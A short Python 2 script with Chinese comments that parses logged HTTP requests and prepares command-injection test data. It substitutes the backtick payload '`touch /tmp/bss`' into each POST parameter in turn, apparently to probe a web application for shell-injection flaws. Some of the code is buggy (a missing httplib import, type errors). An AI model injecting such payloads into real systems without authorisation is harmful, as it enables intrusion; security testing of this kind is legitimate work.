# coding=utf-8
import urllib, urllib2, json
import time
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

# 全局变量，保存分析后的request每项数据
all_analized_data = []

def analize_data():

	logfile = open("request.log")
	recorde_flag = False	# 总标志位:是否分析当前行进行记录
	all_request_data = []
	current_request_data = ""

	# 第一遍扫描，扫描出所有的request内容部分，并保存到数组all_request_data中
	for line in logfile:

		if line.strip().startswith("GET") or line.startswith("POST"):
			recorde_flag = True		# 开始记录request请求内容

		if recorde_flag == True and line.strip().startswith("======"):
			recorde_flag = False	# 结束记录request请求内容

			all_request_data.append(current_request_data)
			current_request_data = ""

		if recorde_flag == True:	# 每个请求作为数组
			current_request_data += line

	# 第二遍扫描，分离header和post数据
	for element in all_request_data:

		analize_element = element.split("\r\n")	# 按行分离单个request数据
		analize_element.pop()	# 剔除毛刺
		# print analize_element

		# 进一步处理每行的数据
		first_line = None
		headers = {}	
		data = ""
		
		first_line = analize_element[0].split(" ")	# 将第一行分离为数组
		data = analize_element[-1]	# 最后一行保存为data部分

		# 其余为headers部分，解析成字典
		for e in analize_element[1:]:

			if len(e.strip()) != 0:
				key = e.split(":")[0].strip()
				value = e.split(":")[1].strip()

				headers[key] = value

			else:
				break

		last_element = {}
		last_element["first_line"] = first_line
		last_element["headers"] = headers
		last_element["data"] = data

		# 处理完成添加到总数据数组中
		all_analized_data.append( last_element )	# 这样操作后第一个元素为GET所在行
													# 中间为headers数据
													# 然后是''隔离header与POST数据部分
													# 最后一个元素为POST或GET的提交内容，GET为空

def send_request():
	
	first_request = all_analized_data[1]
	# print "request to send:",first_request

	Host = first_request["headers"]["Host"]
	url = "http://" + Host + first_request["first_line"][1]
	headers = first_request["headers"]
	data = first_request["data"]

	print sys.getdefaultencoding()

	print "URL: " + url + "\n"
	print "Headers: ", headers , "\n"
	print "Data: ", data

	if first_request["first_line"][0] == "GET":

		req = urllib2.Request(url, data, headers)
		# print req
		response = urllib2.urlopen(req)
		html = response.readlines()

		print "GET Response: " + html

	else:
		data="abc"

		data_urlencoding = urllib.urlencode(data)
		conn = httplib.HTTPConnection(Host)

		conn.request(method="POST",url=url,body=data_urlencoding,headers = headers) 
		response = conn.getresponse()
		res= response.readlines()
		print "POST Response: " + res

		conn.close()

def modify_variable_one_by_one():
	req_1 = all_analized_data[0]
	print req_1

	if req_1["first_line"][0] == "GET":
		print 'get method'


	else:
		print 'post method'
		attack_command = "`touch /tmp/bss`"

		data = req_1["data"]
		print "Initial data is:\n",data,"\n"

		args = data.split("&")
		count = len(args)

		for i in range(count):

			current_arg = args[i]
			equal_num_position = current_arg.find("=")

			modified_arg = current_arg[0:equal_num_position+1] + attack_command
			print "Modified data: " + modified_arg

			backup_arg_data = current_arg

			args[i] = modified_arg
			modified_total_data = "&".join(args)
			args[i] = backup_arg_data

			print "Modified total test arg:\n",modified_total_data,"\n"


			# for j in range(count):

			# 	if i == j:
			# 		modified_total_data += modified_arg
			# 	else:
			# 		modified_total_data += args[j]
			# print "Modified test data: ", modified_total_data,"\n"



def main():

	analize_data()

	# for i in all_analized_data:
		# print i, "\n"
	# print all_analized_data
	# send_request()
	modify_variable_one_by_one()



if __name__ == '__main__':
	main()